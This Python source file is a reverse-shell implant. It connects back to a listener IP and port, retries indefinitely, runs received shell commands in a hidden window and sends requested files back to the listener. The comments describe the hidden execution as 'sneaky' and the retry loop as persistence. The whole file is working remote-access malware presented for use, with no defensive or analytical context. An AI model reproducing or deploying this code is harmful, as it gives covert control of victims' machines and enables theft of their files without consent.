import socket as net
import subprocess as sb
import os
import json
import time

# Configuration
CALLBACK_IP = "127.0.0.1" # Change this to your Listener's IP
CALLBACK_PORT = 4444

# --- SNEAKY CONFIGURATION ---
# Windows-specific flag to hide the subprocess window
# If running on Linux/Mac, this flag is ignored or needs removal
CREATE_NO_WINDOW = 0x08000000 

def connect():
    while True:
        try:
            s = net.socket(net.AF_INET, net.SOCK_STREAM)
            s.connect((CALLBACK_IP, CALLBACK_PORT))
            return s
        except:
            # If connection fails, wait 5 seconds and try again (Persistence)
            time.sleep(5)

def main():
    s = connect()
    
    while True:
        try:
            # Receive command
            cmd = s.recv(1024).decode().strip()
            
            if cmd == "exit":
                break
                
            # --- FILE DOWNLOAD LOGIC ---
            if cmd.startswith("download"):
                try:
                    filename = cmd.split(" ")[1]
                    if os.path.exists(filename):
                        # 1. Create Label
                        label = {
                            "filename": filename,
                            "filesize": os.path.getsize(filename),
                            "action": "download"
                        }
                        s.send(json.dumps(label).encode())
                        
                        # 2. Handshake (Wait for OK)
                        ack = s.recv(1024).decode()
                        if ack == "OK":
                            # 3. Send File
                            with open(filename, "rb") as f:
                                chunk = f.read(4096)
                                while chunk:
                                    s.send(chunk)
                                    chunk = f.read(4096)
                    else:
                        s.send(b"Error: File does not exist.")
                except Exception as e:
                    s.send(f"File Error: {str(e)}".encode())
            
            # --- NORMAL SHELL COMMANDS ---
            else:
                # SNEAKY EXECUTION: creationflags=CREATE_NO_WINDOW
                proc = sb.Popen(cmd, shell=True, 
                              stdout=sb.PIPE, stderr=sb.PIPE, stdin=sb.PIPE,
                              creationflags=CREATE_NO_WINDOW)
                
                output = proc.stdout.read() + proc.stderr.read()
                
                if not output:
                    output = b"[+] Command executed successfully (no output)"
                    
                s.send(output)
                
        except Exception as e:
            # If connection drops, break loop to reconnect
            break
            
    s.close()

if __name__ == "__main__":
    while True:
        # Keep trying to reconnect forever if the listener goes offline
        main() 
